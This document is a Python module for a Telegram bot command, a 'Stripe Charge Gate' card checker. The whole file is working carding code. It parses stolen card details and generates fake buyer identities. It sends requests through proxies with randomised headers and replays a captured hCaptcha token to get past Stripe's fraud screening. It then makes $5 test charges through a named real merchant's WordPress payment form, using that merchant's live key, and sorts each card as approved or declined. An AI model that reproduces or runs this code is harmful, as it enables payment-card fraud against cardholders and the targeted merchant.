# ============================================================
#  CHR1 Checker — Stripe Charge Gate
#  /chr1 command in Telegram bot
# ============================================================

import requests
import random
import time
import os
import json

try:
    from faker import Faker
    fake = Faker()
except ImportError:
    fake = None

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
CONFIG_FILE = os.path.join(DATA_DIR, "chr1_config.json")

_DEFAULT_CFG = {
    "site_url": "https://lookpresentable.com",
    "stripe_pk": "pk_live_51M9D6VIFzsjOdHuvBDMdwQXnNRFj6MMOuVOGPX353t99sdWaxNKToOf1f70BkVfARHXsNk6fQ48KRNhOTT13B7l6004mlxHKua",
    "hcaptcha_token": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc1NTQ3ODkxLCJjZGF0YSI6InB5MDhQMXdCT3NDdTFRZ0RmSmptbGhjK3ZTUzFpN3lzN204bFFZRmNESkM1amhqWmp1dzc2aUNBZXhmTUw2bExibER0M3ZXNGlVSXNva01ueU9Ccm5SRTRJb3BHdTdjemQwNWRlQ0VUWG9TRDlBaG0xV1BGY2FDWlU1a28wNEh3WG8ydkhoK0tGclFNTWZRMTVTSDhsMGpMMy9XcytqRGx1OFVEOWhDcHhYamFBbjVrWXZhQ1NTQlQrMDZrb2NBendZS0lsZldQR3ljRDNGMnpxSFV0ODQ3eUk0ai9jK0kwSkttRytkWlJIakpzSWpTenUyaTJac2xzRmNwUGNVK2dZekhDZDZxOVFLVUNFM3d5Q3dHZVYzUTlnbmpmbFFlMXMyMFFFQm5zc25SL3RFRTVWTC9CR0ZpUEloZVVtZVdUZjM3eElCeE5rRUZ1TFQ3RU5OeElOY3d2MTVCdmNFS2REQktVdXVuVUluUT0yNWJlMDRVSXlwREhGdXFrIiwicGFzc2tleSI6IllaTlRiRTJSdUJoeGYreWV3S2tIR1QwQ00xT1NRclJ3Sm43cEc5TkF6ZXYrbFZLN0w3MDQzM2E1djRkSTc3bjZQa21MM1hRV1FlS1ZETDRENWhRSUc5YXpCc3lQZE5ZY1N2b1Z2NVdKY1c1YlpUcWZDa0I1QUlnb0F2SVZ3QmZXQXowTkZiQzNacGlETWVuMjdWMC9RU25LNnhlbktrYkZPTXVKbTRQWXFoc1kyRDBEL09HZStHVzM2MWZBK1ZIU3p0MFhFN01ZRW43ajNaT0VPU2JnZENKWG9hcmgvMDExMGlPSTFhYUgrMnRXa2pwcjhYZU93ci81RE8zeE9tVm16YVJNS3JWcWZtaitqRVk1S3JWOVhoMGg4WGJCTEw1ajFid3BQTFcrRmhab1YvUnFadEhOeTB0ek5ySCtMc1lMSUcxM1E3NFdXbmtVcUk0R0IwM1BsRVlJNHVrQXNrQzlxakR4Tkk4cDgrS3hIZHpjMHJVMEJRNUM1WjQ0NWMyL3VkMy84eGZGSVNvS1pudjRYbmgwWURuOTRxalh6Q0JUVmRBb2JiM3BiR1J3ckJGL1I5NWx6SzJoWmNhczBUYTJtdUdxN29KUDNwaS9BN1cxREc2SVZlQVUvSkJxQy9LZVcyYktKcTI1elRQYVFGbG9wTE1TK29LU3VzZ2dLbUtTcm0wdGM4Rm9rTjRNS0pCNkhMV0phMmFlaGtYeW82WTdQbjN0SnBQQ3lmVHRPQThXVFh0d2pqcEU3dGZOUDNXZFF2dWRQWFhLUTY4NVpwaE1PL1hMcitOeEtkWnd0dmxVcHNhWU1NL2RSQzBzUG1hN2lYMWsxQkxyWEJXcWJPQ3lzUzFTbkY0dkhmUUVlZW1jdW10UWVuaWt1NmFyOGFiZ214VnVFSEVZSWJMMUw2cmpHbVQ0QnJ3RHdmeGdlOUxKUmY0ZzVMazNuV0ZBSERlcFNhb29aeS9nYUd5OHhsTjQ2aDRUQ3dWQjBIV2d6Uy9wcDJidDdhMXpmSk1YWVFPbVVrTlJ5UFhkakQ2dC81MW1LV3o0bVJLbVUrQzk5aHhNL3h1OExYOS9OWmVnZUYvbHdQc2N5UmZiYXhsanFWZklVbzM5ei9XeUF5Z2RjVElRSEdxNW5VMHlVZkFhSmNpZWZDbUtIY1U5RytyYTJsOWM3WXI3djlGdVBRN3VGNUd4WGZHUEpibGx3L2tiWGs5ODNqQnZJU2RMbExoUEFlTzlsV2FHWkVMUXpTV2dzWG5PeWgyOXZFQ2FCenNDNkJXUDhsemJrMTBtaWZKeFRXZU5HcFd2RUtuS1RmcFZhZy9LMFFOQlNqTnZ3b1NxbjF4VzBDODB0UVRTSGhMNHZsL2ZlU1AwVEtydlNLR1NHZ2QrbEN3WUU2N3daYmNna3dTcXhTMUNNYVVFQWJqNllCL2hZQWRUaS9WWjNzUW9FcHhyLzY3Mk43YXZDU0gwclhBSEZFMHlTVXRveXpQalRjQlArZHZ2Y1dnTVczck5mL3hOUDIwUitiOEZOSkE0MVBWR3RodHN2a1pDdnpMUnYvR0oxc3dqdDJMMHZDdWNONmRDa0RwSHdsYlN3V1p1UTRKSXBwYm8wcFdSTGV5QUV3RlpyQ002UlArWWxRcUl4cGhpcmRySHFMWjNNWlFaUERteng1dWYrS3NFa3MzQk05WXVRNzNya1pSZzc0VjI1K2lmcWFPM1R2NGcxOVZOMmtFZEN4NldmeG1kbXVyTHp1VnRUVzhIR1owLzJZeGpWdWZ0a1RtNS9aVEx0Wkh4VThUeUdwL3ZBOTJuc3RvTHI2bWlIUXhnSWplaUUwc1hJUWliNzNMTDlwNGtaZ1ROc1QzNWxuMU5jZE5kMjUwcklaelMrQkhubW1BTHFPYThhUjZ6eEsxZlNDTlN1eEVZaVJCQWQvbTkrK1N3TnU0VW1pWFd4MVVTZFEvQU1hS2RIUXhGa0RuSldkR1lpV3BOZzBzYlpyc0NXSDk0N0RzYW9YVUtzUFRXYnlMSHN1RDYyRTdnTEFDQk9Pd2hnVmtOU21mOGN3UStoN0tKVlRnY0lZblVXVkI3YndUdE8xZjJIZVJ5dDQ0TE9ubERsQjNtWHpsTnY2dHQ1OGtJa1F2YUk0NzF1Sy9sczJsWXZpRmJseU9UQ1o3VUFVUTQwZnJocjQxSDBuUmd0alg1S0JTdVYwdnBUc2luV1VyRVhwOEdLK1VLTW5jUGdDb0R3RjBUVXIwNC9KdEJSdVRsUCtiZlFQUzB0dk5iNnhObDhTL3JhMnJ0N3pnN040R283TVJweFA3aHN1YzBNaVUydXlXK2h3a3FhN1JibFphUkNFTHNiV2p2Q2R5bDhDZHp0S0xMQlN5WGxVZ3NSY0VSallLRklxZnlva3FtOENRTEdZbDUzTVBNaE12aGlIcXNVazdHSlNaSFYzSzZGWjBFaFFMSWhpQ0VkMzJkSlR3M2ppUkxLeS9oY20rRzFXc2pzaDdHUmtBT21rNGlqMDUyRk1tQUFsNFh2ZHpwMjBnL016NmlQMys2VHBnQVV4WHNxQVRiZXl4UTYyTmkyZmR6bjRER3BtanlhU3hBakhJRDBRWVg3eVhPdjU3NkoraU9hRTNvSmtmM1JjZ1lrSndTMXBnUzFWWmJZd1BBSlhETFZ1bTFFdy9TYitYZ3I4QWZwam5yMzVXdGs3Z1VET2JQQ01XRytlT1BkK0pnUHdJeVJDU1MzdTVwbnJLRWdTWDdBdm9yVmZuWDRsRXNUTWE4T2lBdnpsdjMiLCJrciI6ImZkOTQ5MmUiLCJzaGFyZF9pZCI6MzM5NTEwMzAzfQ.ghr1DIiWnn80osOZLbq84vL52SdK5Zx5NkphM9t3vX4",
    "form_name": "Annabeyetiquette",
    "amount": "5.00",
}


def _load_cfg():
    os.makedirs(DATA_DIR, exist_ok=True)
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(_DEFAULT_CFG, f, indent=2)
        return dict(_DEFAULT_CFG)
    try:
        with open(CONFIG_FILE, 'r') as f:
            cfg = json.load(f)
        for k, v in _DEFAULT_CFG.items():
            cfg.setdefault(k, v)
        return cfg
    except Exception:
        return dict(_DEFAULT_CFG)


def _save_cfg(cfg):
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)


def update_config(key, value):
    cfg = _load_cfg()
    cfg[key] = value
    _save_cfg(cfg)


def get_config():
    return _load_cfg()


def _rh(l=32):
    return ''.join(random.choices('0123456789abcdef', k=l))


def _guid():
    return f"{_rh(8)}-{_rh(4)}-{_rh(4)}-{_rh(4)}-{_rh(12)}"


def _rand_headers():
    ua = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
        'Mozilla/5.0 (Linux; Android 10; K) Chrome/139.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) Chrome/79.0'
    ]
    lang = ['en-US,en;q=0.9', 'tr-TR,tr;q=0.9', 'fr-FR,fr;q=0.9']
    ref = ['https://google.com', 'https://bing.com', 'https://facebook.com']
    return {
        'User-Agent': random.choice(ua),
        'Accept-Language': random.choice(lang),
        'Referer': random.choice(ref),
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    cfg = _load_cfg()

    try:
        p = cc_line.strip().split('|')
        if len(p) != 4:
            return "Declined | Invalid format"

        num, mon, year, cvv = p[0], p[1].zfill(2), p[2][-2:], p[3]

        s = requests.Session()
        if proxy_dict:
            s.proxies.update(proxy_dict)

        s.get(f'{cfg["site_url"]}/checkout/', timeout=30)

        if fake:
            name = f"{fake.first_name()} {fake.last_name()}"
            email = fake.email()
        else:
            name = f"John Smith{random.randint(10,99)}"
            email = f"user{random.randint(1000,9999)}@gmail.com"

        stripe_data = (
            f'type=card&billing_details[name]={name}&card[number]={num}&card[cvc]={cvv}'
            f'&card[exp_month]={mon}&card[exp_year]={year}&guid={_guid()}&muid={_rh()}'
            f'&sid={_rh()}&payment_user_agent=stripe.js%2F22fc71f1a3%3B+stripe-js-v3%2F22fc71f1a3%3B+card-element'
            f'&referrer={cfg["site_url"]}&time_on_page={random.randint(30000,60000)}'
            f'&client_attribution_metadata[client_session_id]={_guid()}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&client_attribution_metadata[wallet_config_id]={_guid()}'
            f'&key={cfg["stripe_pk"]}'
            f'&radar_options[hcaptcha_token]={cfg["hcaptcha_token"]}'
        )

        r = s.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Linux; Android 10; K) Chrome/139.0 Mobile',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0'
                ]),
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/'
            },
            data=stripe_data,
            timeout=30
        )

        try:
            r_json = r.json()
        except (json.JSONDecodeError, ValueError):
            elapsed = round(time.time() - start, 2)
            return f"Error | Empty response from Stripe (HTTP {r.status_code}) | {elapsed}s"

        if 'id' not in r_json:
            err = r_json.get('error', {}).get('message', 'Unknown')
            elapsed = round(time.time() - start, 2)
            if 'insufficient' in err.lower():
                return f"Approved | Insufficient Funds | {err} | {elapsed}s"
            return f"Declined | {err} | {elapsed}s"

        pay_resp = s.post(
            f'{cfg["site_url"]}/wp-admin/admin-ajax.php',
            headers=_rand_headers(),
            data={
                'action': 'wp_full_stripe_inline_payment_charge',
                'wpfs-form-name': cfg["form_name"],
                'wpfs-form-get-parameters': '%7B%7D',
                'wpfs-custom-amount': cfg["amount"],
                'wpfs-card-holder-email': email,
                'wpfs-card-holder-name': name,
                'wpfs-terms-of-use-accepted': '1',
                'wpfs-custom-amount-index': '0',
                'wpfs-stripe-payment-method-id': r_json['id']
            },
            timeout=30
        )

        try:
            pay = pay_resp.json()
        except (json.JSONDecodeError, ValueError):
            elapsed = round(time.time() - start, 2)
            return f"Error | Empty response from merchant (HTTP {pay_resp.status_code}) | {elapsed}s"

        elapsed = round(time.time() - start, 2)

        if pay.get('success'):
            return f"Approved | Charged ${cfg['amount']} | {elapsed}s"

        msg = pay.get('message', pay.get('exceptionMessage', 'Unknown'))
        if 'insufficient' in msg.lower():
            return f"Approved | Insufficient Funds | {msg} | {elapsed}s"
        return f"Declined | {msg} | {elapsed}s"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
        return "ConnError | Connection failed"
    except requests.exceptions.Timeout:
        return "ConnError | Timeout"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    cfg = _load_cfg()
    try:
        r = requests.get(f'{cfg["site_url"]}/checkout/', timeout=15)
        if r.status_code == 200 and 'stripe' in r.text.lower():
            return True, "Stripe checkout active"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
